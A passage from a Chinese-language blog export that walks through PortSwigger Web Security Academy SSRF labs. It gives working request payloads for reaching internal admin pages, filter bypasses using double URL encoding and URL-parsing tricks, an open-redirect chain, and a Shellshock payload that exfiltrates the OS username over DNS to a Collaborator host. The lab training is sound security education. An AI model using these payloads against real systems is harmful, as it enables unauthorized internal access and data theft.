&“”号的作用](https://www.cnblogs.com/kaituorensheng/p/3776527.html)\n","slug":"PortSwigger-Web-Security-Academy-SSRF","published":1,"updated":"2022-07-21T07:10:47.743Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyf000dwku1345jgzgg","content":"<h2 id=\"SSRF简介\"><a href=\"#SSRF简介\" class=\"headerlink\" title=\"SSRF简介\"></a>SSRF简介</h2><p><strong>SSRF</strong>（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>\n<h2 id=\"常见的-SSRF-攻击\"><a href=\"#常见的-SSRF-攻击\" class=\"headerlink\" title=\"常见的 SSRF 攻击\"></a>常见的 SSRF 攻击</h2><p><strong>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。</strong>这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。</p>\n<h3 id=\"针对服务器本身的SSRF攻击\"><a href=\"#针对服务器本身的SSRF攻击\" class=\"headerlink\" title=\"针对服务器本身的SSRF攻击\"></a>针对服务器本身的SSRF攻击</h3><p>在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如<code>127.0.0.1</code>（指向环回适配器的保留 IP 地址）或<code>localhost</code>（同一适配器的常用名称）。</p>\n<p>例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n</code></pre>\n<p>这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。</p>\n<p>在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n</code></pre>\n<p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p>\n<p>当然，攻击者可以直接访问<code>/admin</code>URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对<code>/admin</code>URL 的请求来自本地机器本身时，会绕过正常的<a href=\"https://portswigger.net/web-security/access-control\">访问控制。</a>应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。</p>\n<h3 id=\"针对其他后端系统的-SSRF-攻击\"><a href=\"#针对其他后端系统的-SSRF-攻击\" class=\"headerlink\" title=\"针对其他后端系统的 SSRF 攻击\"></a>针对其他后端系统的 SSRF 攻击</h3><p>服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。</p>\n<p>在前面的示例中，假设后端 URL 有一个管理界面<code> https://192.168.0.68/admin</code>。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n</code></pre>\n<h2 id=\"针对本地服务器的基本SSRF\"><a href=\"#针对本地服务器的基本SSRF\" class=\"headerlink\" title=\"针对本地服务器的基本SSRF\"></a>针对本地服务器的基本SSRF</h2><h3 id=\"靶场地址\"><a href=\"#靶场地址\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost\">web-security/ssrf/lab-basic-ssrf-against-localhost</a></p>\n<h3 id=\"靶场说明\"><a href=\"#靶场说明\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成这个实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<h3 id=\"实验步骤\"><a href=\"#实验步骤\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、浏览<code>/admin</code>并观察您无法直接访问管理页面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png\"></p>\n<p>2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png\"></p>\n<p>3、将<code>stockApi</code>参数中 的 URL 更改为<code>http://localhost/admin</code>。发送请求包后能看到管理界面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png\"></p>\n<p>4、读取HTML识别删除目标用户的URL，即：<code>http://localhost/admin/delete?username=carlos</code></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png\"></p>\n<p>5、成功删除carlos用户。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png\"></p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：</p>\n<ul>\n<li>访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 <strong>当与服务器本身建立连接时，会绕过检查。</strong></li>\n<li>出于灾难恢复的目的，<strong>应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问</strong>。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。</li>\n<li>管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。</li>\n</ul>\n<p>这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。</p>\n<h2 id=\"针对其他后端系统的-SSRF-攻击-1\"><a href=\"#针对其他后端系统的-SSRF-攻击-1\" class=\"headerlink\" title=\"针对其他后端系统的 SSRF 攻击\"></a>针对其他后端系统的 SSRF 攻击</h2><h3 id=\"靶场地址-1\"><a href=\"#靶场地址-1\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system\">web-security/ssrf/lab-basic-ssrf-against-backend-system</a></p>\n<h3 id=\"靶场说明-1\"><a href=\"#靶场说明-1\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请使用库存检查功能<code>192.168.0.X</code>在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户<code>carlos</code>。</p>\n<h3 id=\"实验步骤-1\"><a href=\"#实验步骤-1\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>简单点说就是上一个实验+爆破url</p>\n<p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。</p>\n<p>2、先清除标记，然后将<code>stockApi</code>参数中的url更改为<code>http://192.168.0.1:8080/admin</code>，并标记IP地址的最后一位，即标记“1”。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png\"></p>\n<p>3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png\"></p>\n<p>4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png\"></p>\n<p>5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：<code>/admin/delete?username=carlos</code>，即可删除<code>carlos</code>用户。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png\"></p>\n<h2 id=\"常见的-SSRF-防御绕过\"><a href=\"#常见的-SSRF-防御绕过\" class=\"headerlink\" title=\"常见的 SSRF 防御绕过\"></a>常见的 SSRF 防御绕过</h2><p>通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。</p>\n<ul>\n<li><p>绕过基于黑名单的 SSRF防御措施</p>\n</li>\n<li><p>绕过基于白名单的SSRF防御措施</p>\n</li>\n<li><p>通过开放重定向绕过SSRF防御措施</p>\n</li>\n</ul>\n<h2 id=\"基于黑名单的SSRF防御措施绕过\"><a href=\"#基于黑名单的SSRF防御措施绕过\" class=\"headerlink\" title=\"基于黑名单的SSRF防御措施绕过\"></a>基于黑名单的SSRF防御措施绕过</h2><p>一些应用程序会阻止包含诸如<code>127.0.0.1</code>、<code>localhost</code>之类的主机名或诸如<code>/admin</code>之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：</p>\n<ul>\n<li>使用替代 IP 表示<code>127.0.0.1</code>，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>。</li>\n<li>将您自己的域名解析为<code>127.0.0.1</code>. 您可以<code>spoofed.burpcollaborator.net</code>用于此目的。</li>\n<li>使用 URL 编码或大小写变体混淆被阻止的字符串。</li>\n</ul>\n<h3 id=\"靶场地址-2\"><a href=\"#靶场地址-2\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter\">web-security/ssrf/lab-ssrf-with-blacklist-filter</a></p>\n<h3 id=\"靶场说明-2\"><a href=\"#靶场说明-2\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<p>开发人员部署了两个需要绕过的SSRF 弱防御措施。</p>\n<h3 id=\"实验步骤-2\"><a href=\"#实验步骤-2\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>，观察到请求被阻止。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png\"></p>\n<p>2、通过将 URL 更改为：<code>http://localhost/</code>,还是被防火墙拦截了!</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png\"></p>\n<p>3、通过双 URL 编码将<code>a</code>混淆为 <code>%25%36%31</code>,此时为<code>http://loc%25%36%31lhost/</code>。防火墙未拦截，成功以管理员身份访问系统。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png\"></p>\n<p>4、搜索管理面板url</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png\"></p>\n<p>5、访问管理面板</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png\"></p>\n<p>6、又拦截了，再次将admin中的<code>a</code>url编码两次提交,绕过防火墙!</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png\"></p>\n<p>7、删除carlos账户</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png\"></p>\n<p>8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png\"></p>\n<h2 id=\"基于白名单的-SSRF防御措施\"><a href=\"#基于白名单的-SSRF防御措施\" class=\"headerlink\" title=\"基于白名单的 SSRF防御措施\"></a>基于白名单的 SSRF防御措施</h2><p>某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。</p>\n<p>URL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：</p>\n<ul>\n<li>您可以使用<code>@</code>字符 在主机名之前的 URL 中嵌入凭据。例如：<code>https://expected-host@evil-host</code></li>\n<li>您可以使用<code>#</code>字符来指示 URL 片段。例如：<code>https://evil-host#expected-host</code></li>\n<li>您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：<code>https://expected-host.evil-host</code></li>\n<li>您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。</li>\n<li>您可以一起使用这些技术的组合。</li>\n</ul>\n<h3 id=\"靶场地址-3\"><a href=\"#靶场地址-3\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter\">web-security/ssrf/lab-ssrf-with-whitelist-filter</a></p>\n<h3 id=\"靶场说明-3\"><a href=\"#靶场说明-3\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<p><strong>开发人员已经部署了您需要绕过的反 SSRF 防御。</strong></p>\n<h3 id=\"实验思路\"><a href=\"#实验思路\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png\"></p>\n<p>2、将 URL 更改为<code>http://username@stock.weliketoshop.net/</code>并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png\"></p>\n<p>3、将<code>#</code>附加到用户名后并观察到该 URL 现在被拒绝。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png\"></p>\n<p>4、双 URL 编码<code>#</code>为<code>%2523</code>，并观察到响应，表明服务器已经访问localhost。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png\"></p>\n<p>5、改成如下url:访问到admin页面</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png\"></p>\n<p>6、要访问管理界面并删除目标用户，请将 URL 更改为：<code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png\"></p>\n<h2 id=\"通过开放重定向漏洞绕过的-SSRF防御\"><a href=\"#通过开放重定向漏洞绕过的-SSRF防御\" class=\"headerlink\" title=\"通过开放重定向漏洞绕过的 SSRF防御\"></a>通过开放重定向漏洞绕过的 SSRF防御</h2><p>有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。</p>\n<p>在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。</p>\n<p>例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：</p>\n<pre><code class=\"bash\">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net\n</code></pre>\n<p>返回重定向到：</p>\n<pre><code>http://evil-user.net\n</code></pre>\n<p>您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin\n</code></pre>\n<p>这个 SSRF 漏洞利用有效，因为应用程序首先验证<code>stockAPI</code>提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>\n<h3 id=\"靶场地址-4\"><a href=\"#靶场地址-4\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection\">web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></p>\n<h3 id=\"靶场说明-4\"><a href=\"#靶场说明-4\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://192.168.0.12:8080/admin</code>并删除用户<code>carlos</code>。</p>\n<p>库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。</p>\n<h3 id=\"实验思路-1\"><a href=\"#实验思路-1\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>尝试篡改<code>stockApi</code>参数，观察到无法让服务器直接向不同的主机发出请求。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png\"></p>\n<p>2、点击“下一个产品”，观察<code>path</code>参数被放入重定向响应的Location头中，导致开放重定向。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png\"></p>\n<p>3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的<code>stockApi</code>参数中。构造payload如下：</p>\n<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin\n</code></pre>\n<p>   观察库存检查器是否遵循重定向并向您显示管理页面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png\"></p>\n<p>4、修改路径以删除目标用户：</p>\n<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png\"></p>\n<p>成功删除carlos,完成实验。</p>\n<h2 id=\"盲-SSRF-漏洞\"><a href=\"#盲-SSRF-漏洞\" class=\"headerlink\" title=\"盲 SSRF 漏洞\"></a>盲 SSRF 漏洞</h2><p>盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。</p>\n<h3 id=\"什么是盲-SSRF？\"><a href=\"#什么是盲-SSRF？\" class=\"headerlink\" title=\"什么是盲 SSRF？\"></a>什么是盲 SSRF？</h3><p>当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。</p>\n<h3 id=\"盲-SSRF-漏洞的影响是什么？\"><a href=\"#盲-SSRF-漏洞的影响是什么？\" class=\"headerlink\" title=\"盲 SSRF 漏洞的影响是什么？\"></a>盲 SSRF 漏洞的影响是什么？</h3><p>盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。</p>\n<h3 id=\"如何发现和利用盲-SSRF-漏洞\"><a href=\"#如何发现和利用盲-SSRF-漏洞\" class=\"headerlink\" title=\"如何发现和利用盲 SSRF 漏洞\"></a>如何发现和利用盲 SSRF 漏洞</h3><p>检测盲 SSRF 漏洞最可靠的方法是使用带外 ( <a href=\"https://portswigger.net/burp/application-security-testing/oast\">OAST</a> ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。</p>\n<p>使用带外技术最简单、最有效的方法是使用<a href=\"https://portswigger.net/burp/documentation/collaborator\">Burp Collaborator</a>。您可以使用<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。</p>\n<pre><code>提示:\n在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。\n</code></pre>\n<h3 id=\"带外检测的盲SSRF\"><a href=\"#带外检测的盲SSRF\" class=\"headerlink\" title=\"带外检测的盲SSRF\"></a>带外检测的盲SSRF</h3><p>简单地识别可以触发带外 HTTP 请求的盲<a href=\"https://portswigger.net/web-security/ssrf\">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>\n<h3 id=\"靶场地址-5\"><a href=\"#靶场地址-5\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection\">portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</a></p>\n<h3 id=\"靶场说明-5\"><a href=\"#靶场说明-5\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>\n<p>要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。</p>\n<pre><code>注意事项:\n为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。\n</code></pre>\n<h3 id=\"实验步骤-3\"><a href=\"#实验步骤-3\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、在<a href=\"https://portswigger.net/burp/pro\">Burp Suite Professional</a>中，转到 Burp 菜单并启动<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png\"></p>\n<p>2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png\"></p>\n<p>3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png\"></p>\n<p>5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。</p>\n<p>6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png\"></p>\n<h2 id=\"使用-Shellshock-利用盲SSRF\"><a href=\"#使用-Shellshock-利用盲SSRF\" class=\"headerlink\" title=\"使用 Shellshock 利用盲SSRF\"></a>使用 Shellshock 利用盲SSRF</h2><p>简单地识别可以触发带外 HTTP 请求的盲<a href=\"https://portswigger.net/web-security/ssrf\">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>\n<h3 id=\"靶场地址-6\"><a href=\"#靶场地址-6\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation\">web-security/ssrf/blind/lab-shellshock-exploitation</a></p>\n<h3 id=\"靶场说明-6\"><a href=\"#靶场说明-6\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>\n<p>为了完成实验，请使用此功能对 8080 端口范围内的内部服务器<code>192.168.0.X</code>执行<a href=\"https://portswigger.net/web-security/ssrf/blind\">盲 SSRF</a>攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。</p>\n<h3 id=\"实验步骤-4\"><a href=\"#实验步骤-4\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、在<a href=\"https://portswigger.net/burp/pro\">Burp Suite Professional</a>中，从 BApp Store 安装“Collaborator Everywhere”扩展。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png\"></p>\n<p>2、将实验室的域添加到 Burp Suite 的<a href=\"https://portswigger.net/burp/documentation/desktop/tools/target/scope\">Scope</a>，以便 Collaborator Everywhere 将其作为目标。</p>\n<p>浏览网站。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png\"></p>\n<p>3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png\"></p>\n<p>4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png\"></p>\n<p>5、将请求发送到产品页面给 Burp Intruder。</p>\n<p>6、使用<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：</p>\n<pre><code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN\n</code></pre>\n<p>7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。</p>\n<p>单击“清除 §”，将 Referer 标头更改为<code>http://192.168.0.1:8080</code>突出显示 IP 地址的最后一个八位字节（数字<code>1</code>），单击“添加 §”。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png\"></p>\n<p>8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png\"></p>\n<p>9、点击“开始攻击”。</p>\n<p>攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。<a href=\"https://portswigger.net/web-security/ssrf\">您应该会看到由成功的盲SSRF 攻击</a>命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png\"></p>\n<p>要完成实验，请输入操作系统用户的名称。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png\"></p>\n<p>另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。<a href=\"https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient\">点击详细阅读</a>。</p>\n<h2 id=\"为-SSRF-漏洞寻找隐藏的攻击面\"><a href=\"#为-SSRF-漏洞寻找隐藏的攻击面\" class=\"headerlink\" title=\"为 SSRF 漏洞寻找隐藏的攻击面\"></a>为 SSRF 漏洞寻找隐藏的攻击面</h2><p>许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。</p>\n<h3 id=\"请求中的部分-URL\"><a 